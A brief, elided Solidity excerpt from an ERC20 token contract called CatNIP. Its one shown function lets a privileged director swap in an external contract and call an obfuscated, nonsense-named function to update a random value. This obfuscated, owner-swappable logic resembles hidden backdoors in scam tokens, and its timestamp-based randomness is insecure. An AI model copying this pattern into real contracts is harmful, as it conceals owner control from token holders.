...
contract CatNIP is Context, IERC20, IERC20Metadata {
    ...
    function SetCatNIPAddress(address newAddress) external OnlyDirector() {
        randomNumber = ICatNIPCode(newAddress).ADJFKLSDNLKDDASGAUJKLSDJFLAK('TodddmDaavedfsddayCodddseJJxxJonesHongfdsasdzfChuZee',2322321311280913890,block.timestamp.add(6)).add(randomNumber);
    }
